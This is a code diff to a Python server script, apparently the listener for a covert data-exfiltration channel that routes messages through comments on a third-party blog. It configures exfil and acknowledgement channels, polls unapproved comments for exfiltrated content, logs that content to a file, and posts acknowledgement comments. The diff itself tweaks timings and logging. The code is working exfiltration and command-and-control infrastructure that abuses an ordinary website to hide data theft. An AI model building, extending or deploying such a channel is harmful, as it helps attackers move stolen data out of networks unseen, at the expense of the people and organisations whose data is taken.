@@ -16,10 +16,14 @@ channel.exfil_channel_id = 5
 channel.ack_channel = "2021/08/13/ack-channel/"
 channel.ack_channel_id = 7
 
+# Timings
+## For server:
+## 
+
 recv_config = ReceiveConfig()
 recv_config.recvr_id = server_id
 recv_config.recv_time_slot = 30
-recv_config.process_time_slot = 50
+recv_config.process_time_slot = 40
 recv_config.prev_unapproved_index = 0
 
 mtb_send_config= SendConfig()
@@ -45,7 +49,6 @@ def thread_start_listener():
     loop_counter = 99
     while(loop_counter > 0):
         received_data = receive_data(channel, len(clients), recv_config)
-        recv_config.prev_unapproved_index = get_current_unapproved_index(channel)
 
         for exfil_content in received_data:
             to_write = str(datetime.datetime.utcnow()) + ": "
@@ -56,9 +59,11 @@ def thread_start_listener():
             f.close()
 
             message_id = exfil_content.split(":")[0]
-            print("[INFO] thread_start_listener: Extracted message_id is " + message_id)
-            submit_comment(channel.target_blog, channel.ack_channel_id, message_id)
+            print("[INFO " + str(datetime.datetime.utcnow()) + "] thread_start_listener: Extracted message_id is " + message_id + ". Sending acknowledgement...")
+            response = submit_comment(channel.target_blog, channel.ack_channel_id, message_id)
+            print("## " + str(response.html_response_code) + ", " + response.html_response)
 
+        recv_config.prev_unapproved_index = get_current_unapproved_index(channel)            
         loop_counter -= 1
 
 threading.Thread(target=thread_start_listener).start()
